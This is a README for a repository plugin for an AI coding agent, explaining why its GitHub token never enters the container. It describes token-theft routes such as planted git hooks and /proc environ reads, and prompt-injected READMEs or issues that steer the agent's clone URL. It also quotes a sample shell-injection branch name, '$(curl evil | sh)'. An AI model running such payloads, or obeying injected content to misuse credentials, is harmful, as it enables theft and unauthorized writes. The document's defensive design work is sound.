# `@loopingai/plugins/repo`

Clone, commit, push a work branch, open a pull request.

```ts
import { repo } from "@loopingai/plugins/repo";
import { computerExec } from "@loopingai/plugins/computer";

repo({
  // Runs in the container. Never given a credential.
  exec: computerExec({ binding: env.WORKSPACE, workspaceName: () => name }),
  // Yours to implement — this package exports the `RepoGit` type, not a
  // backing for it, because the token has to live on your side of the
  // boundary. Clone, fetch and push only; see "Where the token lives" below.
  // `looping-starter`'s coder does it with isomorphic-git inside the Durable
  // Object that owns the workspace filesystem.
  git: workspaceGit({ binding: env.WORKSPACE }),
  token: () => env.GITHUB_TOKEN
});
```

Tools: `repo_clone`, `repo_status`, `repo_diff`, `repo_commit`, `repo_push`,
`repo_open_pr`, `repo_issue_view`, `repo_pr_view`, `repo_pr_comment`.

The last three are the ones a model reaches for `gh` to do — read an issue, check
a pull request, leave a comment. They are here rather than in the container for
the same reason `repo_open_pr` is: installing a CLI and giving it a token would
hand that token to the shell the model drives. They resolve the repository from
the checkout's own origin, so they add no new model input to validate and no new
way to point the credential somewhere nobody asked about.

Two injected dependencies, and the line between them is the trust boundary rather
than a matter of taste. `exec` is anything that runs a command in the container —
[`/computer`](../computer/)'s `computerExec` is one such thing, and injecting it
keeps the two plugins independent, so a host with its own container can use this
against that and the tests here need no container at all. `git` is the other side:
the three operations that talk to the forge, run by the host, with the credential
never crossing over. See below for why that split exists.

## Where the token lives

Not in the container. Not for a moment, not in one command, not in one process's
environment.

`clone`, `fetch` and `push` — the three operations that authenticate — do not run
there. They go to the injected `git`, which the host implements on its own side of
the boundary. The coder in `looping-starter` runs isomorphic-git inside the Durable
Object that owns the workspace filesystem: the same files the container mounts,
reached without a shell. No hooks, no `ext::` transport, no template directory, no
credential helpers.

Everything else still runs in the container through `exec`, because none of it needs
to authenticate: `status`, `diff`, `add`, `commit`, `checkout`. That is the whole
rule for changing this plugin — an operation that talks to the forge does not belong
on `exec`, and one that does not has no business anywhere else.

The rule is absolute rather than careful because the narrower versions do not hold.
Git is a general-purpose command runner: it executes what `.git/config` and
`.git/hooks` name, both live in the workspace filesystem, and a co-installed shell
tool can write them — so a planted `pre-push` hook reads the token straight out of
the environment an ordinary `repo_push` gives it. Patching that key by key fails
too, because a URL-specific `http.<url>.sslVerify=false` in the repository's own
config beats a `-c` override: specificity outranks precedence. And a token that
lives in a process environment for the length of one command is readable at
`/proc/<pid>/environ` by anything else on a filesystem the model has root on.

Two more rules, about the forge rather than the container:

- **Never offered to a host you did not allow.** The clone URL is model input: a
  repository README, an issue body, or a page a co-installed browser plugin fetched
  is enough to choose it. So the URL's host must be on `allowedHosts` (default:
  `github.com`) before anything runs at all, and the allowlist travels with every
  call so the host can bind the check to the moment the credential would actually be
  handed over — which is also the only check that sees a host arrived at by
  redirect. A URL carrying userinfo or a port is refused outright: both travel on to
  the host's git, and userinfo is where URL parsers disagree about which host is
  named. `origin` is re-derived and re-checked on every push rather than remembered,
  because the checkout's `.git/config` is a file the container can rewrite.
- **The forge API is called from the Worker.** So the credential that can write
  through the API never crosses into the container either. Every tool that uses it —
  `repo_open_pr`, `repo_issue_view`, `repo_pr_view`, `repo_pr_comment` — resolves
  the repository from the **checkout's own origin** rather than from a parameter.
  That is deliberate and it matters most for `repo_open_pr`, the one that writes: a
  repository named at the call site would be bounded only by the host allowlist, so
  an agent talked into naming one could open a pull request on anything the token
  can write to.

Model-authored values — URLs, branch names, commit messages — reach the container as
environment variables rather than being interpolated into a command, so a branch
name of `$(curl evil | sh)` is inert text. That is about shell injection rather than
credentials, and it is independent of all of the above.

What remains is not zero, and is worth naming precisely:

- **The token's reach is the token's own.** This plugin checks the _host_ a clone or
  push may target, never the repository — so whatever the credential can read or
  write, an agent talked into naming it can reach. That is deliberate: a repository
  allowlist here would block legitimate work like filing a pull request against a
  dependency. It does mean the `GITHUB_TOKEN` should be fine-grained and scoped to
  what the agent is actually for, because nothing below it will narrow it further.
- **The host is trusted with the credential**, which is the point, but it moves the
  question rather than deleting it. A host that implements `git` by shelling out
  inside the container has undone all of the above, and this plugin cannot tell.

## Guardrails are in the tool, not the prompt

`repo_push` refuses, before running anything, in three layers — a guardrail a
model can talk itself out of is not a guardrail:

1. **Anything that is not a plain branch name.** `git push origin <name>` reads
   `<name>` as a _refspec_, so `+x:main` is a force push to main and `x:main` an
   ordinary one — neither of which a list of forbidden names ever sees, because
   it only compares literal strings.
2. **`main`, `master`, `trunk`, `develop`.**
3. **The repository's own default branch**, read from the remote. A repo whose
   trunk is `release` deserves the same protection, and only the remote can say.

It then refuses a fourth thing, after switching to the branch: **a branch with no
commits the default branch does not already have.** Pushing one succeeds,
`repo_open_pr` opens an empty pull request on it, and the round reports a URL as
if the work had landed — the one outcome worse than an error.

`repo_push` **switches to** an existing branch and only creates a missing one —
`checkout -b`, never `-B`. `-B` is create-or-_reset_, so on a branch that already
holds the commit it force-moves it to wherever HEAD is now: the commit survives
only as an unreferenced object, and what gets pushed is an empty branch with a pull
request opened on it.

`repo_clone` is re-entrant, because a container that outlives its task comes back
with the checkout still in it. It fetches and resets a clean one, and **refuses a
dirty one** rather than resetting over the top: those changes are an earlier task's
work, and discarding them is the one outcome nobody can undo. A checkout is matched
by repository rather than by the exact URL string, so `.../o/r`, `.../o/r.git` and
`.../o/r/` all recognise the tree that is there.

It also refuses a URL that names no repository — `.../tree/main`, `.../pull/4`,
what a model copies out of a browser. Cloning one anyway means never telling
`beforeCheckout` which repository this is, so a host keying its filesystem per
repository never switches and the checkout lands in whichever one was already open.
The refusal says what to send instead, which costs a turn and no guessing.

## When the container is not there

`exec` does not only return failures, it throws them: `@cloudflare/computer` throws
when a container is replaced mid-command, and a Durable Object call can fail
outright. None of that reaches the model as a tool error — it is caught where the
command is run and comes back through each tool's own failure sentence, so
`repo_status` says it could not read the status and `repo_push` says the push did
not go, each carrying what a replaced container actually means: nothing finished,
the checkout is durable and untouched, and retrying is safe because these commands
push one branch to the branch of the same name and never force.

The distinction that costs something if you get it wrong is between a command
that **answered no** and one that **never ran**. Three places here read a failure
as an answer — "no checkout in this directory", "no such branch", "no default
branch to protect" — and a container that vanished must not be read as any of
them. A replaced container is exactly the case where the next command lands on a
working replacement, so a probe misread as "empty directory" would send `git
clone` at a checkout that is already there.

## Output is bounded

Every tool truncates from the middle at `maxOutputChars` (16,000 characters by
default), the
same way `sb_exec` does. `repo_diff` also takes `stat: true` for a per-file
changed-line summary — the right first call on a large change, and the only
practical one for an agent whose entire view of the work is the diff.

## Requirements

A `GITHUB_TOKEN` secret with contents + pull-request write, a container with
`git` on it for the local half, and a `git` implementation on the host's side for
the three operations that authenticate.
